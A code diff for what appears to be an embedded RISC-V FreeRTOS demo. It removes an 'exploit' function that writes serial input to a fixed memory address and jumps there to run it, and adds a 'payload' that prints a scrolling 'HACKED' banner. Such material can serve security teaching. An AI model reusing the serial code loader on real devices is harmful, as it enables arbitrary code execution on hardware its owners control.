@@ -17,27 +17,39 @@
 
 #include <stdio.h>
 
-void exploit(void);
+void payload(void);
 
 extern int start;
 
-void exploit(void){
+void payload(void){
 
-	signed char* pointer = (signed char*)0x8000d290;
-    printf("\nReady4Payload\n");
+	const char * hacked = "\n##     ##    ###     ######  ##    ## ######## ########  \n"
+	"##     ##   ## ##   ##    ## ##   ##  ##       ##     ## \n"
+	"##     ##  ##   ##  ##       ##  ##   ##       ##     ## \n"
+	"######### ##     ## ##       #####    ######   ##     ## \n"
+	"##     ## ######### ##       ##  ##   ##       ##     ## \n"
+	"##     ## ##     ## ##    ## ##   ##  ##       ##     ## \n"
+	"##     ## ##     ##  ######  ##    ## ######## ########  \n";
+
 
     for(;;){
-        signed char buff[2] = {0};
-        if (xSerialGetChar(1, (signed char *) &buff, 100) == 0) {
-        	if(pointer == (signed char*)0x8000d290){
-                continue;
-        	}else{
-        		asm("fence.i");
-                goto *(void *)0x8000d290;
-        	}
-        }
-		*pointer = buff[0];
-		pointer++;
-    }
+        setLeds(0x9700, 0);
 
+		for(int a = 0;a<10;a++){
+			printf("\f");
+			for(int i = 0;i<a;i++){
+				printf("\n");
+			}
+			printf("%s",hacked);
+			vTaskDelay(100);
+		}
+		for(int a = 10;a>0;a--){
+			printf("\f");
+			for(int i = 0;i<a;i++){
+				printf("\n");
+			}
+			printf("%s",hacked);
+			vTaskDelay(100);
+		}
+    }
 }
